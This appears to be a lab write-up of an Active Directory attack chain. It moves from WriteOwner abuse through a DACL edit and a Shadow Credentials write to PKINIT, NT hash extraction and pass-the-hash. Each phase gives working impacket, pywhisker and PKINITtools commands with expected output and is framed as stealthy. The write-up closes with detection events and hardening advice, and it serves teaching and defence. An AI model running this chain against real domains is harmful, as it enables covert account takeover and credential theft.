# DACL Abuse → Shadow Credentials: Full Attack Chain

**Environment:** lab2019.local | DC: WIN-JOCP945SK51 (172.16.61.136)  
**Starting foothold:** lowpriv / Passw0rd123!  
**Constraint:** No password change on target account  
**Objective:** Read flag from CTO_BRO-accessible share

---

## The Misconfiguration

The Managers security group has `WriteOwner` over `CTO_BRO`. `lowpriv` is a member of Managers. This is the entire attack surface — a single delegated ACE on the wrong object.

In BloodHound this appears as:

```
LOWPRIV → MemberOf → MANAGERS → WriteOwner → CTO_BRO
```

---

## Why Shadow Credentials Instead of a Password Reset?

`WriteOwner` → `dacledit FullControl` gives you complete control over the target object's security descriptor. The obvious next step taught in most courses is to reset the password. But:

- Password changes are logged and visible to the user and helpdesk
- A sudden password change on a C-suite account triggers immediate investigation
- The user is locked out until they notice and escalate

**Shadow Credentials** sidestep this entirely. The `msDS-KeyCredentialLink` attribute stores Windows Hello for Business certificate keys. If you write your own certificate to this attribute, the KDC will accept it as proof of identity via PKINIT (certificate-based Kerberos pre-authentication). You obtain a TGT, extract the NT hash via the U2U protocol, and authenticate as the target — without the password ever being read, changed, or expired.

From the target's perspective: nothing happened. No login failure, no password change notification, no lockout. The account continues to work normally.

---

## Tools Required

| Tool | Purpose |
|------|---------|
| `impacket-owneredit` | Transfer ownership of AD object to attacker-controlled account |
| `impacket-dacledit` | Write FullControl ACE to target object's DACL |
| `pywhisker` | Write attacker certificate to `msDS-KeyCredentialLink` |
| `gettgtpkinit.py` (PKINITtools) | Authenticate with certificate via PKINIT, obtain TGT |
| `getnthash.py` (PKINITtools) | Extract NT hash from TGT via U2U Kerberos exchange |
| `impacket-smbclient` | Pass-the-hash access to target resources |

---

## Pre-Attack Setup

### /etc/hosts

```bash
echo "172.16.61.136 WIN-JOCP945SK51.lab2019.local lab2019.local" | sudo tee -a /etc/hosts
```

### Clean environment

```bash
unset KRB5CCNAME
rm -f *.pfx *.ccache dacledit-*.bak
```

---

## Phase 1 — Ownership Takeover (owneredit)

`lowpriv` exercises the WriteOwner right inherited via Managers membership to transfer ownership of CTO_BRO's AD object to itself.

```bash
impacket-owneredit -action write -new-owner lowpriv -target CTO_BRO \
  -dc-ip 172.16.61.136 'lab2019.local/lowpriv:Passw0rd123!'
```

**Expected output:**
```
[*] Current owner: Domain Admins
[*] OwnerSid modified successfully!
```

**What happens in AD:** The `nTSecurityDescriptor` owner field on CTO_BRO changes from `S-1-5-21-...-512` (Domain Admins) to `S-1-5-21-...-1103` (lowpriv). Ownership implicitly allows DACL modification without requiring an explicit WriteDACL ACE.

---

## Phase 2 — Grant FullControl (dacledit)

With ownership established, `lowpriv` grants itself FullControl over CTO_BRO's AD object.

```bash
impacket-dacledit -action write -rights FullControl -principal lowpriv \
  -target CTO_BRO -dc-ip 172.16.61.136 'lab2019.local/lowpriv:Passw0rd123!'
```

**Expected output:**
```
[*] DACL backed up to dacledit-<timestamp>.bak
[*] DACL modified successfully!
```

**What happens in AD:** An ACE is added to CTO_BRO's DACL granting `lowpriv` `CCDCLCSWRPWPDTLOCRSDRCWDWO` — every right including WriteProperty on all attributes, including `msDS-KeyCredentialLink`.

---

## Phase 3 — Write Shadow Credential (pywhisker)

`lowpriv` uses its FullControl to write a self-generated certificate into CTO_BRO's `msDS-KeyCredentialLink` attribute.

```bash
pywhisker -d lab2019.local -u lowpriv -p 'Passw0rd123!' \
  --dc-ip 172.16.61.136 --target CTO_BRO --action add --filename cto_key
```

**Expected output:**
```
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: cto_key.pfx
[*] Must be used with password: <generated_password>
```

**What happens in AD:** A new value is added to `msDS-KeyCredentialLink` on CTO_BRO containing the attacker's public key. The DC will now accept this certificate as valid proof of CTO_BRO's identity for PKINIT authentication.

---

## Phase 4 — PKINIT TGT Request (gettgtpkinit)

Use the certificate to authenticate as CTO_BRO and obtain a TGT.

```bash
python3 ~/PKINITtools/gettgtpkinit.py lab2019.local/CTO_BRO \
  -cert-pfx cto_key.pfx -pfx-pass <pfx_password> cto.ccache
```

**Expected output:**
```
[*] Requesting TGT
[*] AS-REP encryption key (you might need this later):
[*] <64-char hex key>
[*] Saved TGT to file
```

Save the AS-REP encryption key — required for the next step.

**What happens in Kerberos:** The KDC receives an AS-REQ with pre-authentication type 16 (PKINIT). It validates the certificate against the key stored in `msDS-KeyCredentialLink`, and issues a TGT for CTO_BRO.

---

## Phase 5 — NT Hash Extraction (getnthash)

Extract CTO_BRO's NT hash from the TGT using the U2U (User-to-User) Kerberos exchange.

```bash
export KRB5CCNAME=$(pwd)/cto.ccache
python3 ~/PKINITtools/getnthash.py lab2019.local/CTO_BRO -key <AS-REP_key>
```

**Expected output:**
```
[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
<32-char hex hash>
```

**What happens in Kerberos:** getnthash requests a service ticket from CTO_BRO to CTO_BRO (U2U). Because the TGT was obtained via PKINIT, the PAC in the service ticket contains the NT hash encrypted with the AS-REP session key. The tool decrypts it using the key captured in Phase 4.

---

## Phase 6 — Pass-the-Hash

Authenticate as CTO_BRO using the recovered NT hash. CTO_BRO's password is never known or changed.

```bash
impacket-smbclient lab2019.local/CTO_BRO@WIN-JOCP945SK51.lab2019.local \
  -hashes :<NT_hash> -k -no-pass
```

```
# use CTOFiles
# cat flag.txt
Shadow_Creds_CEO_Pwned
```

---

## Blue Team: What Should Have Fired

### Event 4662 — WRITE_OWNER (Access Mask 0x80000)

`lowpriv` performing a WriteOwner operation on `CTO_BRO`. A standard domain user taking ownership of another user object has no legitimate use case. This is Phase 1.

### Event 5136 — nTSecurityDescriptor modified (ownership transfer)

Paired Value Deleted / Value Added on `nTSecurityDescriptor`. The deleted value has `O:DA` (Domain Admins as owner). The added value has `O:S-1-5-21-...-1103` (lowpriv). Confirms ownership transferred. This is Phase 1 confirmed.

### Event 4662 — WRITE_DAC (Access Mask 0x40000)

`lowpriv` modifying the DACL on `CTO_BRO`. Follows immediately after the ownership event from the same logon session. This is Phase 2.

### Event 5136 — nTSecurityDescriptor modified (FullControl ACE added)

The updated DACL blob now contains `A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-1103` — FullControl for lowpriv. This is Phase 2 confirmed.

### Event 5136 — msDS-KeyCredentialLink Value Added

`lowpriv` adding a value to `msDS-KeyCredentialLink` on `CTO_BRO`. **This is the highest-confidence detection event in the entire chain.** No standard domain user has any legitimate reason to write to this attribute on another account. Zero expected false positives in a normal environment. This is Phase 3.

### Event 4768 — PKINIT TGT (Pre-Authentication Type 16)

TGT request for `CTO_BRO` with Pre-Auth Type 16 (certificate-based). `Certificate Issuer Name: CTO_BRO` — self-signed, no CA. This means the certificate was not issued by any PKI infrastructure in the environment. A user account authenticating with a self-signed certificate is anomalous. This is Phase 4.

### Event 4769 — U2U (Service Name = Account Name)

`CTO_BRO` requesting a service ticket to `CTO_BRO`. A user requesting a ticket to itself has no legitimate use case and is a reliable indicator of NT hash extraction via PKINITtools. This is Phase 5.

---

## Why This Gets Missed

- DS Access auditing (`Directory Service Changes`) is disabled by default on most DCs
- Even when enabled, events 4662 and 5136 require a **SACL on the target object** — audit policy alone is insufficient
- Most environments audit DCSync and Kerberoasting; DACL manipulation on user objects is rarely monitored
- The attack leaves no process execution on the DC — it's pure LDAP and Kerberos traffic
- CTO_BRO's password is never changed — no password change alert, no user complaint, no helpdesk ticket

---

## Hardening

- Audit `msDS-KeyCredentialLink` writes via SACL on all privileged user objects
- Alert on any 5136 where a non-DC account writes to `msDS-KeyCredentialLink`
- Alert on 4768 with Pre-Auth Type 16 from non-machine, non-service accounts
- Add high-value accounts (C-suite, service accounts) to the Protected Users group — prevents NTLM and forces Kerberos AES
- Audit the Managers → WriteOwner → CTO_BRO ACE — this misconfiguration is the root cause. Run BloodHound regularly to detect excessive DACL permissions
- Implement a tiered admin model: delegated rights should never reach sensitive user objects via flat group membership

<img width="1803" height="388" alt="2026-02-22_11-37" src="https://github.com/user-attachments/assets/afee64d1-acd6-4f23-a79b-d661dc777f91" />
<img width="1839" height="793" alt="2026-02-22_11-38" src="https://github.com/user-attachments/assets/3aff6648-90da-43ff-a4f6-acead1f0fd11" />

https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab




